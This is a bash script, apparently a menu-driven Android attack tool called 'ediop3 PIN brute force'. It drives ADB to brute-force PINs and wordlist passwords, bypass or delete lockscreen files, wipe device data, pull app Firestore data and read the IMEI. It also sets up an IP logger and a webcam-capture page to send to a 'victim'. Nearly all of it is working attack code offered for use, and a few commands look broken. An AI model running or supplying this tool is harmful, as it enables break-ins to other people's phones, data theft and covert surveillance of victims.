#!/bin/bash

if [ "$(id -u)" != "0" ]; then
    echo "This script must be run as root. Try 'sudo bash $0'" 1>&2
    exit 1
fi

check_tools() {
    command -v adb >/dev/null 2>&1 || { echo >&2 "ADB is not installed. Installing..."; apt-get install android-tools-adb -y; }
    command -v fastboot >/dev/null 2>&1 || { echo >&2 "Fastboot is not installed. Installing..."; apt-get install android-tools-fastboot -y; }
    command -v metasploit-framework >/dev/null 2>&1 || { echo >&2 "Metasploit is not installed. Installing..."; apt-get install metasploit-framework -y; }
    command -v scrcpy >/dev/null 2>&1 || { echo >&2 "Scrcpy is not installed. Installing..."; apt-get install scrcpy -y; }
}

update_tools() {
    echo "[+] Updating system and tools..."
    apt-get update && apt-get upgrade -y
    apt-get install git wget curl -y
    git clone https://github.com/adi1090x/termux-style.git /opt/termux-style
    echo "[+] Update complete!"
}

brute_4digit() {
    echo "[!] Works only if: USB Debugging enabled + No lockout policy"
    echo "[!] Most phones lock after 5-10 attempts!"
    read -p "Continue? (y/n): " confirm
    [ "$confirm" != "y" ] && return
    
    echo "[+] Starting 4-digit PIN brute force..."
    for i in {0000..9999}; do
        echo "Trying PIN: $i"
        adb shell input text "$i" && adb shell input keyevent 66
        sleep 1
    done
}

brute_6digit() {
    echo "[!] Works only if: USB Debugging enabled + No lockout policy"
    echo "[!] Extremely slow - impractical for real use!"
    read -p "Continue? (y/n): " confirm
    [ "$confirm" != "y" ] && return
    
    echo "[+] Starting 6-digit PIN brute force..."
    for i in {000000..999999}; do
        echo "Trying PIN: $i"
        adb shell input text "$i" && adb shell input keyevent 66
        sleep 1
    done
}

brute_wordlist() {
    echo "[!] Requires: USB Debugging enabled + Screen awake"
    read -p "Enter path to wordlist: " wordlist
    if [ ! -f "$wordlist" ]; then
        echo "Wordlist not found!"
        return
    fi
    
    echo "[+] Starting wordlist brute force..."
    while IFS= read -r password; do
        echo "Trying: $password"
        adb shell input text "$password" && adb shell input keyevent 66
        sleep 1
    done < "$wordlist"
}

bypass_lockscreen() {
    echo "[!] Only works on Android 4.0-7.0 (patched in newer versions)"
    read -p "Continue? (y/n): " confirm
    [ "$confirm" != "y" ] && return
    
    echo "[+] Attempting lockscreen bypass..."
    adb shell am start -n com.android.settings/.Settings\$SecuritySettingsActivity
    adb shell input keyevent 4
    adb shell input keyevent 4
    adb shell input keyevent 4
    echo "[+] If successful, device should be unlocked"
}

root_device() {
    echo "[!] WARNING: Most modern phones have secure boot (dm-verity)"
    echo "[!] May brick your device if not compatible!"
    read -p "Continue? (y/n): " confirm
    [ "$confirm" != "y" ] && return
    
    echo "[+] Attempting to root device..."
    adb reboot bootloader
    fastboot flash recovery /opt/supersu/recovery.img
    fastboot boot /opt/supersu/recovery.img
    echo "[+] Please manually flash SuperSU in recovery mode"
}

reset_data() {
    echo "[!] THIS WILL WIPE ALL DATA PERMANENTLY!"
    read -p "Confirm wipe? (type 'YES' to continue): " confirm
    if [ "$confirm" == "YES" ]; then
        echo "[+] Wiping device data..."
        adb reboot recovery
        sleep 10
        adb shell wipe data
        adb shell wipe cache
        adb reboot
    else
        echo "[+] Operation cancelled"
    fi
}

remove_lockscreen() {
    echo "[!] Requires: Root access on target device"
    read -p "Continue? (y/n): " confirm
    [ "$confirm" != "y" ] && return
    
    echo "[+] Removing lockscreen..."
    adb shell "su -c 'rm /data/system/gesture.key'"
    adb shell "su -c 'rm /data/system/password.key'"
    adb shell "su -c 'rm /data/system/locksettings.db'"
    adb reboot
}

ip_logger() {
    echo "[!] Requires: Victim must visit your link"
    echo "[+] Setting up IP logger..."
    git clone https://github.com/kennethreitz/ip-logger /opt/ip-logger
    cd /opt/ip-logger
    python3 -m http.server 80 &
    echo "[+] Send victim to http://$(hostname -I | cut -d' ' -f1)"
}

webcam_capture() {
    echo "[!] Requires: Victim must visit link + grant permissions"
    echo "[+] Setting up webcam capture..."
    git clone https://github.com/wybiral/webcam-capture /opt/webcam-capture
    cd /opt/webcam-capture
    python3 server.py &
    echo "[+] Send victim to http://$(hostname -I | cut -d' ' -f1):8080"
}

firestore_vuln() {
    echo "[!] Most Firestore vulnerabilities patched by Google"
    read -p "Continue? (y/n): " confirm
    [ "$confirm" != "y" ] && return
    
    echo "[+] Checking for Firestore vulnerabilities..."
    adb shell "su -c 'find /data/data/ -name \"*.firestore\" -exec cp {} /sdcard/ \;'"
    adb pull /sdcard/*.firestore /tmp/firestore_data/
    echo "[+] Firestore data downloaded to /tmp/firestore_data/"
}

device_info() {
    echo "[+] Gathering device information..."
    echo "Model: $(adb shell getprop ro.product.model)"
    echo "Manufacturer: $(adb shell getprop ro.product.manufacturer)"
    echo "Android Version: $(adb shell getprop ro.build.version.release)"
    echo "Serial Number: $(adb shell getprop ro.serialno)"
    echo "IMEI: $(adb shell service call iphonesubinfo 1 | awk -F "'" '{print $2}' | sed '1 d' | tr -d '.' | awk '{print $1}')"
}
 
main_menu() {
    clear
    echo "====================================="
    echo "       ediop3 PIN brute force      "
    echo "       (Requires Root + OTG)       "
    echo "         Made by ediop3.            "
    echo "====================================="
    echo
    echo "1.  Update Tools"
    echo "2.  Brute Pin 4 Digit [Works if: USB Debugging + No lockout]"
    echo "3.  Brute Pin 6 Digit [Impractical - too slow]"
    echo "4.  Brute LockScreen Using Wordlist [USB Debugging required]"
    echo "5.  Bypass LockScreen [Android 4.0-7.0 only]"
    echo "6.  Root Android [Rarely works on modern devices]"
    echo "7.  Jump To Adb Toolkit [Reliable if authorized]"
    echo "8.  Reset Data [DESTRUCTIVE! Wipes everything]"
    echo "9.  Remove LockScreen [Requires root access]"
    echo "10. Jump To Metasploit [Needs exploit]"
    echo "11. Control Android (Scrcpy) [Reliable if USB authorized]"
    echo "12. Phone Info [Always works if connected]"
    echo "13. IP Logger [Victim must click link]"
    echo "14. Get WebCam [Victim must allow access]"
    echo "15. FireStore Vuln [Mostly patched]"
    echo "99. Exit"
    echo
    read -p "Select an option: " option

    case $option in
        1) update_tools ;;
        2) brute_4digit ;;
        3) brute_6digit ;;
        4) brute_wordlist ;;
        5) bypass_lockscreen ;;
        6) root_device ;;
        7) adb_toolkit ;;
        8) reset_data ;;
        9) remove_lockscreen ;;
        10) msfconsole ;;
        11) scrcpy ;;
        12) device_info ;;
        13) ip_logger ;;
        14) webcam_capture ;;
        15) firestore_vuln ;;
        99) echo "Exiting..."; exit 0 ;;
        *) echo "Invalid option!"; sleep 1 ;;
    esac
    
    read -p "Press [Enter] to return to menu..."
    main_menu
}

adb_toolkit() {
    clear
    echo "===================="
    echo "    ADB Toolkit    "
    echo "===================="
    echo
    echo "1. List Devices [Works if USB debugging on]"
    echo "2. Connect to Device [Wi-Fi/OTG]"
    echo "3. Install APK [Needs authorization]"
    echo "4. Pull File [Needs permissions]"
    echo "5. Push File [Needs permissions]"
    echo "6. Screenshot [Works if authorized]"
    echo "7. Record Screen [Works if authorized]"
    echo "8. Shell Access [Basic if unauthorized]"
    echo "9. Reboot Device [Always works]"
    echo "0. Back to Main Menu"
    echo
    read -p "Select an option: " adb_option

    case $adb_option in
        1) adb devices ;;
        2) read -p "Enter device IP: " ip; adb connect $ip ;;
        3) read -p "Enter APK path: " apk; adb install $apk ;;
        4) read -p "Enter remote path: " remote; read -p "Enter local path: " local; adb pull $remote $local ;;
        5) read -p "Enter local path: " local; read -p "Enter remote path: " remote; adb push $local $remote ;;
        6) adb exec-out screencap -p > screenshot.png ;;
        7) read -p "Enter output file (e.g., video.mp4): " file; adb shell screenrecord /sdcard/$file ;;
        8) adb shell ;;
        9) adb reboot ;;
        0) main_menu ;;
        *) echo "Invalid option!"; sleep 1 ;;
    esac
    
    read -p "Press [Enter] to continue..."
    adb_toolkit
}

check_tools
main_menu
